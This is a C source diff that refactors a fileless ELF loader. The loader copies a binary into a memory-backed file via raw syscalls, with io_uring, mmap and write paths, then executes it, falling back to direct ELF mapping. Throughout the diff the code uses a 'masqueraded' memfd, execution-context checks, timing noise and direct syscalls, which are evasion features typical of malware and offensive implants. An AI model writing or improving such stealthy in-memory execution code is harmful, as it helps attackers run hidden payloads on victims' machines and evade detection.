@@ -8,7 +8,15 @@
 #include <errno.h>
 #include "common.h"
 
-#ifdef COPY_WITH_IO_URING
+#if !defined(EXEC_DIRECT_ONLY) && \
+    (defined(COPY_WITH_IO_URING) || defined(COPY_WITH_MMAP))
+static int raw_pointer_is_error(const void *pointer) {
+    intptr_t value = (intptr_t)pointer;
+    return value < 0 && value >= -4095;
+}
+#endif
+
+#if defined(COPY_WITH_IO_URING) && !defined(EXEC_DIRECT_ONLY)
 
 static int write_via_io_uring(int memfd, const uint8_t *elf_data, size_t elf_size)
 {
@@ -42,7 +50,7 @@ static int write_via_io_uring(int memfd, const uint8_t *elf_data, size_t elf_siz
         __NR_mmap, (long)NULL, sq_sz,
         PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
         uring_fd, (long)IORING_OFF_SQ_RING);
-    if ((void *)sq_ptr == MAP_FAILED)
+    if (raw_pointer_is_error(sq_ptr))
         goto out_close_uring;
 
     uint8_t *cq_ptr;
@@ -53,7 +61,7 @@ static int write_via_io_uring(int memfd, const uint8_t *elf_data, size_t elf_siz
             __NR_mmap, (long)NULL, cq_sz,
             PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
             uring_fd, (long)IORING_OFF_CQ_RING);
-        if ((void *)cq_ptr == MAP_FAILED)
+        if (raw_pointer_is_error(cq_ptr))
             goto out_unmap_sq;
     }
 
@@ -61,7 +69,7 @@ static int write_via_io_uring(int memfd, const uint8_t *elf_data, size_t elf_siz
         __NR_mmap, (long)NULL, p.sq_entries * sizeof(struct uring_sqe),
         PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
         uring_fd, (long)IORING_OFF_SQES);
-    if ((void *)sqes == MAP_FAILED)
+    if (raw_pointer_is_error(sqes))
         goto out_unmap_cq;
 
     /* Convenience pointers into the SQ control block                     */
@@ -142,33 +150,34 @@ out_close_uring:
     return ret;
 }
 
-#endif /* COPY_WITH_IO_URING */
+#endif /* COPY_WITH_IO_URING && !EXEC_DIRECT_ONLY */
 
 /* ========================================================================= */
 
-int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const argv[], char* const envp[]) {
+#ifndef EXEC_DIRECT_ONLY
 
-   // Allocate randomized address space to leverage ASLR
-    void *randomized_base = (void *)syscall6(__NR_mmap, (long)NULL, elf_size, PROT_NONE, MAP_PRIVATE | MAP_ANON, -1, 0);
-    if (randomized_base == MAP_FAILED) {
-        return -1;
+#ifndef COPY_WITH_MMAP
+static int write_all(int fd, const uint8_t *data, size_t size) {
+    size_t offset = 0;
+
+    while (offset < size) {
+        long written = syscall3(__NR_write, fd, (long)(data + offset),
+                                (long)(size - offset));
+        if (written == -EINTR)
+            continue;
+        if (written <= 0)
+            return -1;
+        offset += (size_t)written;
     }
+    return 0;
+}
+#endif
 
-    // Use masqueraded memfd creation
-    int memfd = create_masqueraded_memfd();
-    if (memfd < 0) {
-        syscall2(__NR_munmap, (long)randomized_base, elf_size);
-        return -1;
-    }
-
-    check_exec_context();
-
-    // Set file size using direct syscall
-    if (syscall2(__NR_ftruncate, memfd, elf_size) < 0) {
-        syscall1(__NR_close, memfd);
-        syscall2(__NR_munmap, (long)randomized_base, elf_size);
-        return -1;
-    }
+static int execute_via_memfd(int memfd, const uint8_t *elf_data,
+                             size_t elf_size, char *const argv[],
+                             char *const envp[]) {
+    if (syscall2(__NR_ftruncate, memfd, (long)elf_size) < 0)
+        goto fail;
 
 #ifdef COPY_WITH_MMAP
     /* ------------------------------------------------------------------
@@ -176,27 +185,17 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
      * ------------------------------------------------------------------ */
     DBG("write path: mmap\n");
     uint8_t *map = (uint8_t *)syscall6(__NR_mmap, (long)NULL, elf_size, PROT_WRITE, MAP_SHARED, memfd, 0);
-    size_t i;
-    if (map == MAP_FAILED) {
-        syscall1(__NR_close, memfd);
-        syscall2(__NR_munmap, (long)randomized_base, elf_size);
-        return -1;
-    }
-    for (i = 0; i < elf_size; ++i) {
-        /* This could be quite a bit faster at the cost of a library call. */
-        map[i] = elf_data[i];
-    }
+    if (raw_pointer_is_error(map))
+        goto fail;
+    memcpy(map, elf_data, elf_size);
 #ifdef _POSIX_MAPPED_FILES
-    if (syscall3(__NR_msync, (long)map, elf_size, MS_SYNC) == -1) {
-        syscall1(__NR_close, memfd);
-        syscall2(__NR_munmap, (long)randomized_base, elf_size);
-        return -1;
+    if (syscall3(__NR_msync, (long)map, elf_size, MS_SYNC) < 0) {
+        syscall2(__NR_munmap, (long)map, elf_size);
+        goto fail;
     }
 #endif /* #ifdef _POSIX_MAPPED_FILES */
-    if (syscall2(__NR_munmap, (long)map, elf_size) == -1) {
-        syscall1(__NR_close, memfd);
-        syscall2(__NR_munmap, (long)randomized_base, elf_size);
-        return -1;
+    if (syscall2(__NR_munmap, (long)map, elf_size) < 0) {
+        goto fail;
     }
 
 #elif defined(COPY_WITH_IO_URING)
@@ -206,9 +205,10 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
      * ------------------------------------------------------------------ */
     DBG("write path: io_uring\n");
     if (write_via_io_uring(memfd, elf_data, elf_size) < 0) {
-        syscall1(__NR_close, memfd);
-        syscall2(__NR_munmap, (long)randomized_base, elf_size);
-        return -1;
+        DBG("io_uring unavailable; falling back to write(2)\n");
+        if (syscall3(__NR_lseek, memfd, 0, SEEK_SET) < 0 ||
+            write_all(memfd, elf_data, elf_size) < 0)
+            goto fail;
     }
 
 #else
@@ -216,11 +216,9 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
      * Path C: plain write(2) syscall (original default).
      * ------------------------------------------------------------------ */
     DBG("write path: plain write(2)\n");
-    if (syscall3(__NR_write, memfd, (long)elf_data, elf_size) != (long)elf_size) {
-        syscall1(__NR_close, memfd);
-        syscall2(__NR_munmap, (long)randomized_base, elf_size);
-        return -1;
-    }
+    if (syscall3(__NR_lseek, memfd, 0, SEEK_SET) < 0 ||
+        write_all(memfd, elf_data, elf_size) < 0)
+        goto fail;
 #endif /* #ifdef COPY_WITH_MMAP */
 
     char memfd_path[256];
@@ -232,8 +230,33 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
     // Execute using direct syscall
     syscall3(__NR_execve, (long)memfd_path, (long)argv, (long)envp);
 
-    // Cleanup on execve failure
-    syscall2(__NR_munmap, (long)randomized_base, elf_size);
+fail:
     syscall1(__NR_close, memfd);
     return -1;
+}
+
+#endif /* !EXEC_DIRECT_ONLY */
+
+int execute_from_memory(uint8_t* elf_data, size_t elf_size,
+                        char* const argv[], char* const envp[]) {
+#ifndef EXEC_DIRECT_ONLY
+    int memfd = create_masqueraded_memfd();
+    if (memfd >= 0) {
+        check_exec_context();
+        if (execute_via_memfd(memfd, elf_data, elf_size, argv, envp) == 0)
+            return 0;
+    }
+
+#ifdef EXEC_MEMFD_ONLY
+    return -1;
+#else
+    DBG("memfd execution unavailable; using direct ELF mapping\n");
+#endif
+#endif
+
+#ifndef EXEC_MEMFD_ONLY
+    check_exec_context();
+    noise_delay(80);
+    return execute_elf_image(elf_data, elf_size, argv, envp);
+#endif
 }
